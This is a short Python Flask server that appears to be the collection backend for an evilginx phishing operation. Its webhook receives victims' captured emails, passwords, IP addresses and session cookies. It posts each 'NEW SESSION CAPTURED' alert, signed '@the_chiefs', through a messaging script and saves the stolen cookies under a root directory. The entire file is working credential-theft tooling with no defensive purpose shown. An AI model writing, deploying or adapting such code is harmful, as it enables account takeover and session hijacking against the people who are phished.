#!/usr/bin/env python3
from flask import Flask, request, jsonify
import subprocess
import json
import time
import os

app = Flask(__name__)

@app.route('/webhook', methods=['POST'])
def webhook():
    try:
        data = request.json
        
        username = data.get('username', 'N/A')
        password = data.get('password', 'N/A')
        cookies = data.get('cookies', [])
        ip = request.remote_addr
        
        message = f"🔴 **NEW SESSION CAPTURED**\n"
        message += f"📧 **Email**: {username}\n"
        message += f"🔑 **Password**: {password}\n"
        message += f"📍 **IP**: {ip}\n"
        message += f"🍪 **Cookies**: {len(cookies)} captured\n"
        message += f"📧 **From @the_chiefs**"
        
        subprocess.run(['/usr/bin/python3', '/usr/bin/send_msg.py', message])
        
        if cookies:
            cookies_dir = "/root/evilginx_sessions"
            if not os.path.exists(cookies_dir):
                os.makedirs(cookies_dir)
            
            filename = f"{cookies_dir}/session_{int(time.time())}.json"
            with open(filename, 'w') as f:
                json.dump(cookies, f, indent=2)
            
            subprocess.run(['/usr/bin/python3', '/usr/bin/send_msg.py', f"📁 Cookies saved: {filename}"])
        
        return jsonify({"status": "success"})
    except Exception as e:
        return jsonify({"status": "error", "message": str(e)})

if __name__ == "__main__":
    app.run(host='0.0.0.0', port=5001, debug=False)
